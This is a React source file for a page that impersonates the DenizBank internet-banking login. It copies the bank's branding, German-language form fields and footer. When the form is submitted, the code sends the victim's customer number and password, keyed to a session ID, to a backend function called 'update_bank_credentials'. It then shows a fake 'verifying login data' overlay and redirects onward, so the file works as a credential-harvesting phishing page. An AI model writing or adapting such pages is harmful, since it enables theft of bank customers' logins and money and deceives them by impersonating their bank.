import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { ChevronDown, ChevronRight } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";

import logo from "@/assets/denizbank-logo.svg";
import bg from "@/assets/denizbank-bg.jpg";
import enbdLogo from "@/assets/enbd-logo.png";
import denizIcon from "@/assets/denizbank-icon.png";
import barrierefreiIcon from "@/assets/denizbank-barrierefrei.svg";
import sperreIcon from "@/assets/denizbank-sperreaufheben.svg";
import passwortVergessenIcon from "@/assets/denizbank-passwortvergessen.svg";
import impressumIcon from "@/assets/denizbank-impressum.svg";
import faqIcon from "@/assets/denizbank-faq.svg";
import datenschutzIcon from "@/assets/denizbank-datenschutz.svg";
import sicherheitIcon from "@/assets/denizbank-sicherheit.svg";
import gbIcon from "@/assets/denizbank-gb.svg";
import telefonIcon from "@/assets/denizbank-telefon.svg";

const Denizbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [kundennummer, setKundennummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [lang, setLang] = useState<"DE" | "EN" | "TR">("DE");
  const [activeTab, setActiveTab] = useState<"privat" | "gemein" | "firma">("privat");
  const [saveUser, setSaveUser] = useState(true);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("DenizBank - Internetbanking", denizIcon);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: kundennummer,
        p_password: passwort,
        p_username_label: "Kundennummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const footerLinks = [
    { icon: impressumIcon, label: "Impressum" },
    { icon: faqIcon, label: "FAQ" },
    { icon: datenschutzIcon, label: "Datenschutz" },
    { icon: sicherheitIcon, label: "Sicherheit" },
    { icon: gbIcon, label: "Geschäftsbedingungen" },
    { icon: telefonIcon, label: "0800 88 66 00" },
  ];

  const InfoBadge = () => (
    <span className="inline-flex h-5 w-5 items-center justify-center rounded-full border border-[#0073b0] text-[#0073b0] text-[11px] font-bold leading-none">i</span>
  );

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen w-full bg-cover bg-center relative"
        style={{ backgroundImage: `url(${bg})`, fontFamily: "'Open Sans', sans-serif" }}
      >
        <div className="absolute inset-0 bg-black/50" />

        <div className="relative min-h-screen flex flex-col">
          {/* Header */}
          <header className="px-6 md:px-10 py-6">
            <div className="max-w-7xl mx-auto flex items-center justify-between">
              <img src={logo} alt="DenizBank" className="h-8 md:h-10" />
              <div className="flex items-center gap-3 md:gap-4 text-white text-sm">
                <button className="hidden md:flex items-center gap-2 px-4 py-2 rounded-full border border-white/80 hover:bg-white/10">
                  <img src={barrierefreiIcon} alt="" className="h-4 w-4 brightness-0 invert" />
                  Barrierefrei
                </button>
                <div className="flex items-center rounded-full border border-white/80 overflow-hidden text-sm">
                  {(["DE", "EN", "TR"] as const).map((l) => (
                    <button
                      key={l}
                      onClick={() => setLang(l)}
                      className={`px-4 py-2 transition ${lang === l ? "bg-white text-gray-800 font-semibold" : "text-white hover:bg-white/10"}`}
                    >
                      {l}
                    </button>
                  ))}
                </div>
              </div>
            </div>
          </header>

          {/* Content */}
          <main className="flex-1 flex items-center px-6 md:px-10 py-10">
            <div className="w-full max-w-7xl mx-auto grid md:grid-cols-2 gap-10 items-end">
              {/* Linke Seite */}
              <div className="text-white">
                <h1 className="text-4xl md:text-6xl font-bold leading-tight">
                  Willkommen<br />bei der DenizBank
                </h1>
                <div className="mt-12 max-w-md border-l-2 border-white/70 pl-5 py-1">
                  <div className="text-lg font-semibold mb-1">Hinweis</div>
                  <p className="text-sm leading-relaxed text-white/90">
                    Bitte teilen Sie Ihre persönlichen Anmeldedaten nicht mit anderen.
                  </p>
                </div>
              </div>

              {/* Login Card */}
              <div className="md:justify-self-end w-full max-w-md">
                {/* Tabs */}
                <div className="grid grid-cols-3 text-sm">
                  {(["privat", "gemein", "firma"] as const).map((t) => {
                    const label = t === "privat" ? "Privat" : t === "gemein" ? "Gemeinschaft" : "Firma";
                    const active = activeTab === t;
                    return (
                      <button
                        key={t}
                        onClick={() => setActiveTab(t)}
                        className={`flex items-center justify-between px-5 py-4 ${
                          active
                            ? "bg-white text-[#e6007e] font-semibold rounded-t-md"
                            : "bg-black/40 text-white/90"
                        }`}
                      >
                        <span>{label}</span>
                        {active ? <ChevronDown className="h-4 w-4" /> : <ChevronRight className="h-4 w-4" />}
                      </button>
                    );
                  })}
                </div>

                {/* Card */}
                <div className="bg-white rounded-b-md p-6 space-y-4 shadow-2xl">
                  <div className="flex items-center justify-between text-sm">
                    <label className="text-gray-800 font-medium">Login (Kundennummer)</label>
                    <div className="flex items-center gap-2">
                      <span className="text-xs text-gray-600">Benutzer speichern</span>
                      <button
                        onClick={() => setSaveUser((s) => !s)}
                        className={`relative inline-flex h-5 w-9 items-center rounded-full transition ${saveUser ? "bg-[#e6007e]" : "bg-gray-300"}`}
                        aria-pressed={saveUser}
                      >
                        <span className={`inline-block h-4 w-4 rounded-full bg-white transition ${saveUser ? "translate-x-4" : "translate-x-0.5"}`} />
                      </button>
                      <InfoBadge />
                    </div>
                  </div>

                  <div className="relative">
                    <input
                      type="text"
                      value={kundennummer}
                      onChange={(e) => setKundennummer(e.target.value)}
                      placeholder="Kundennummer eingeben"
                      className="h-12 w-full rounded border border-gray-300 px-3 pr-10 text-sm focus:border-[#0073b0] focus:outline-none placeholder:text-gray-500"
                    />
                    <span className="absolute right-3 top-1/2 -translate-y-1/2"><InfoBadge /></span>
                  </div>

                  <label className="block text-sm text-gray-800 font-medium pt-1">Passwort</label>
                  <input
                    type="password"
                    value={passwort}
                    onChange={(e) => setPasswort(e.target.value)}
                    placeholder="Passwort eingeben"
                    className="h-12 w-full rounded border border-gray-300 px-3 text-sm focus:border-[#0073b0] focus:outline-none placeholder:text-gray-500"
                  />

                  <button
                    onClick={handleSubmit}
                    className="w-full h-12 rounded text-white font-bold tracking-widest uppercase text-sm hover:opacity-90 transition"
                    style={{ background: "linear-gradient(90deg, #e30613 0%, #e6007e 100%)" }}
                  >
                    Weiter
                  </button>

                  <div className="grid grid-cols-2 gap-3 pt-1">
                    <button className="flex items-center justify-center gap-2 h-11 rounded border border-gray-300 text-sm text-gray-700 hover:bg-gray-50">
                      <img src={sperreIcon} alt="" className="h-4 w-4" />
                      Sperre aufheben
                    </button>
                    <button className="flex items-center justify-center gap-2 h-11 rounded border border-gray-300 text-sm text-gray-700 hover:bg-gray-50">
                      <img src={passwortVergessenIcon} alt="" className="h-4 w-4" />
                      Passwort vergessen
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </main>

          {/* Footer */}
          <footer className="px-6 md:px-10 py-6">
            <div className="max-w-7xl mx-auto flex flex-col md:flex-row md:items-center md:justify-between gap-6">
              <div className="bg-white rounded p-2 inline-flex w-fit">
                <img src={enbdLogo} alt="ENBD" className="h-10" />
              </div>
              <div className="flex flex-wrap items-center gap-x-6 gap-y-3 text-white text-sm">
                {footerLinks.map((l) => (
                  <a key={l.label} href="#" className="flex items-center gap-2 hover:opacity-80">
                    <img src={l.icon} alt="" className="h-4 w-4 brightness-0 invert" />
                    {l.label}
                  </a>
                ))}
              </div>
            </div>
          </footer>
        </div>
      </div>
    </>
  );
};

export default Denizbank;
